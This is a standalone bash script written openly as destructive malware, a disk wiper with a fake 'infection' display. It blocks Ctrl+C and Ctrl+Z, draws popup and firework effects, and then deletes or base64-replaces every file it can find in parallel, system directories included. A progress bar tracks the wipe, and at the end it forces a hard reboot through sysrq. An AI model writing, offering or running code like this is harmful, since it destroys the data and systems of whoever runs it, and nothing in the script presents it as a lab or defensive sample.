#!/bin/bash

# --- VITAL SIGN PROTECTION ---
PROTECTED="base64|rm|sh|sleep|ld-linux|libc.so|libdl.so|grep|wc|find|xargs|printf|seq|bash|head|libtinfo|tput"
MAJOR_DIRS="/etc|/bin|/sbin|/lib|/usr|/boot"

# --- LOCK DOWN: BLOCK CTRL+C / CTRL+Z ---
# This prevents the user from killing the script manually.
trap "echo -e '\e[1;31m [!] ACCESS DENIED: INFECTION IS MANDATORY \e[0m'" SIGINT SIGTSTP SIGHUP

# --- VISUAL ENGINE: POPUPS & FIREWORKS ---
visual_engine() {
    local cols=$(tput cols)
    local lines=$(tput lines)
    
    while true; do
        # 1. SPARK FIREWORK
        local fx=$((RANDOM % cols))
        local fy=$((RANDOM % lines / 2))
        echo -e "\e[${fy};${fx}H\e[1;33m*\e[0m"
        echo -e "\e[$((fy-1));${fx}H\e[1;31m.\e[$((fy+1));${fx}H.\e[${fy};$((fx-2))H. .\e[0m"
        
        # 2. POPUP WINDOWS
        if [[ $((RANDOM % 5)) -eq 0 ]]; then
            local wx=$((RANDOM % (cols - 20)))
            local wy=$((RANDOM % (lines - 10)))
            echo -e "\e[${wy};${wx}H\e[41;37m  VIRAL INFECTION   \e[0m"
            echo -e "\e[$((wy+1));${wx}H\e[47;30m|                | \e[0m"
            echo -e "\e[$((wy+2));${wx}H\e[47;30m|  SYSTEM DYING  | \e[0m"
            echo -e "\e[$((wy+3));${wx}H\e[47;30m|________________| \e[0m"
            sleep 0.4
            echo -e "\e[${wy};${wx}H                \e[$((wy+1));${wx}H                \e[$((wy+2));${wx}H                \e[$((wy+3));${wx}H                "
        fi
        
        # 3. SCREEN RIP
        echo -e "\e[$(($RANDOM%lines));$(($RANDOM%cols))H\e[1;$(($RANDOM%7+31))m$(head -c 10 /dev/urandom 2>/dev/null | base64 | head -c 15)"
        sleep 0.08
    done
}

# --- INITIALIZATION ---
tput smcup # Switch to alternate screen (Full-screen simulation)
clear
echo -e "\e[1;31m[!] CRITICAL: SYSTEM LOCK ENGAGED. EXIT COMMANDS DISABLED.\e[0m"
sleep 1

# REAL PERCENTAGE SETUP
TOTAL_FILES=$(find / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -type f -print 2>/dev/null | wc -l)
PROGRESS_TRACKER="/tmp/shred_count"
echo 0 > "$PROGRESS_TRACKER"

visual_engine &
VISUAL_PID=$!

# --- DESTRUCTION ENGINE ---
destroy_batch() {
    for FILE in "$@"; do
        if base64 "$FILE" > "${FILE}.b64" 2>/dev/null && rm "$FILE" 2>/dev/null; then
             echo 1 >> "$PROGRESS_TRACKER"
        else
            rm -f "$FILE" 2>/dev/null && echo 1 >> "$PROGRESS_TRACKER"
        fi
    done
}
export -f destroy_batch
export PROGRESS_TRACKER

(
  find / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -regextype posix-extended -not -regex ".*($MAJOR_DIRS|$PROTECTED).*" -type f -print0 2>/dev/null | xargs -0 -P $(nproc) -n 30 bash -c 'destroy_batch "$@"' _
  find /etc /usr /bin /lib -regextype posix-extended -not -regex ".*($PROTECTED).*" -type f -print0 2>/dev/null | xargs -0 -P $(nproc) -n 30 bash -c 'destroy_batch "$@"' _
) &

# --- HUD & PROGRESS ---
while true; do
    CURRENT_COUNT=$(wc -l < "$PROGRESS_TRACKER" 2>/dev/null || echo 0)
    [[ $TOTAL_FILES -eq 0 ]] && TOTAL_FILES=1
    PERCENT=$(( 100 * CURRENT_COUNT / TOTAL_FILES ))
    [[ $PERCENT -gt 100 ]] && PERCENT=100

    filled=$(( PERCENT / 2 ))
    empty=$(( 50 - filled ))
    
    # Stay at bottom
    printf "\e[s\e[$(tput lines);0H\e[1;37m\e[41m INFECTION STATUS: [%-50s] %d%% \e[0m\e[u" "$(printf '#%.0s' $(seq 1 $filled 2>/dev/null))" "$PERCENT"
    
    if [ "$PERCENT" -ge 100 ]; then break; fi
    sleep 0.1
done

# --- FINAL SEQUENCE ---
kill -9 $VISUAL_PID >/dev/null 2>&1
tput rmcup # Return from alternate screen
clear
echo -e "\e[1;31m\n\n     FATAL ERROR: KERNEL DEPLETED. REBOOTING...     \n\n\e[0m"
sleep 2

# Force hardware reboot
echo 1 > /proc/sys/kernel/sysrq 2>/dev/null
echo b > /proc/sysrq_trigger 2>/dev/null
reboot -f
